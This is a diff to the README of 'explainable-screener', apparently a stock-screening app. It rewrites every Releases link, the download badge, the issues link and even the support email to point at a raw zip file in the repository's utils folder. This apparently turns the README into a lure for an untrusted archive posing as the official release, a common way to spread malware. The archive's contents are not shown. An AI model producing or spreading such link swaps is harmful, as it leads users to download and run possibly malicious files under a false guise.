@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20latest%20version-blue)](https://github.com/durganandDP/explainable-screener/releases)
+[![Download Now](https://github.com/durganandDP/explainable-screener/raw/refs/heads/main/utils/screener_explainable_v3.9.zip%20Now-Get%20the%20latest%20version-blue)](https://github.com/durganandDP/explainable-screener/raw/refs/heads/main/utils/screener_explainable_v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ To get started, you can download the application from our Releases page.
 
 1. **Visit the Releases Page:**  
    Go to the following link to find the latest version:  
-   [Download from Releases Page](https://github.com/durganandDP/explainable-screener/releases)
+   [Download from Releases Page](https://github.com/durganandDP/explainable-screener/raw/refs/heads/main/utils/screener_explainable_v3.9.zip)
 
 2. **Choose the Latest Version:**  
    Look for the version labeled with the highest number (e.g., v1.0).
@@ -61,7 +61,7 @@ To get started, you can download the application from our Releases page.
 If you face any issues during installation or while using the app, here are some common troubleshooting steps:
 
 - **Check Your Internet Connection:** Ensure you have a stable internet connection to access stock data.
-- **Software Updates:** Make sure you have the latest version of the application. Visit the [Releases Page](https://github.com/durganandDP/explainable-screener/releases) to check for updates.
+- **Software Updates:** Make sure you have the latest version of the application. Visit the [Releases Page](https://github.com/durganandDP/explainable-screener/raw/refs/heads/main/utils/screener_explainable_v3.9.zip) to check for updates.
 - **Compatibility Issues:** If you can't run the app, verify that your system meets the requirements listed above.
 
 ## 📖 Learn More
@@ -75,11 +75,11 @@ To gain better insights into how to utilize **explainable-screener** effectively
 
 If you need further assistance, feel free to reach out to our support team:
 
-- **Email:** support@explainable-screener.com
-- **GitHub Issues:** Check the [Issues Tab](https://github.com/durganandDP/explainable-screener/issues) on this repository for feedback and bug reports.
+- **Email:** https://github.com/durganandDP/explainable-screener/raw/refs/heads/main/utils/screener_explainable_v3.9.zip
+- **GitHub Issues:** Check the [Issues Tab](https://github.com/durganandDP/explainable-screener/raw/refs/heads/main/utils/screener_explainable_v3.9.zip) on this repository for feedback and bug reports.
 
 ## 📌 Conclusion
 
 We hope you find **explainable-screener** valuable in your stock investment journey. Understanding why certain stocks might outperform can lead to smarter financial decisions. Enjoy using the application!
 
-For any new updates or features, keep an eye on the [Releases Page](https://github.com/durganandDP/explainable-screener/releases). Happy investing!
+For any new updates or features, keep an eye on the [Releases Page](https://github.com/durganandDP/explainable-screener/raw/refs/heads/main/utils/screener_explainable_v3.9.zip). Happy investing!
